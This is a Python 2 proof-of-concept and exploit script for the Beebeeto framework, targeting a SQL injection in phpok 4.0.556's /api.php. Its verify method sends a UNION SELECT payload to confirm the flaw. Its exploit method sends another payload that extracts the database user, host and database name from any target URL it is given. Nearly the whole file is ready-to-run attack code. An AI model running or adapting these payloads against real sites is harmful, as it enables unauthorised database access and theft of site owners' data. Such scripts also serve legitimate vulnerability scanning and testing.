#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0046',
            'name': 'phpok 4.0.556 /api.php SQL注入漏洞 POC & Exploit',
            'author': 'tmp',
            'create_date': '2014-10-02',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'phpok',
            'vul_version': ['4.0.556'],
            'type': 'SQL Injection',
            'tag': ['phpok漏洞', 'SQL注入漏洞', '/api.php'],
            'desc': '缺陷文件：framework/phpok_call.php line：108',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-064360',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("/api.php?c=api&f=phpok&id=_project&param[pid]=1%20UNION%20SELECT%201,"
                    "concat_ws(0x3a3a,0x346B7765,user(),0x346B3761,md5(123321),0x77653571),3,"
                    "4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        content = urllib2.urlopen(req).read()
        if 'c8837b23ff8aaa8a2dde915473ce0991' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args


    @classmethod
    def exploit(cls, args):
        payload = ("/api.php?c=api&f=phpok&id=_project&param[pid]=1%20UNION%20SELECT%201,"
                    "concat_ws(0x3a3a,0x346B7765,user(),0x346B3761,database(),0x77653571),3,"
                    "4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        content = urllib2.urlopen(req).read()
        u_h_db = re.findall('4kwe::(.*?)::4k7a::(.*?)::we5q', content)
        if u_h_db:
            (u_h,DBname) = u_h_db[0]
            index = u_h.rfind('@')
            (Username,Hostname) = (u_h[:index],u_h[index+1:])
            
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['Database'] = {}
            args['poc_ret']['Database']['Hostname'] = Hostname
            args['poc_ret']['Database']['Username'] = Username
            args['poc_ret']['Database']['DBname'] = DBname
            return args
        args['success'] = False
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
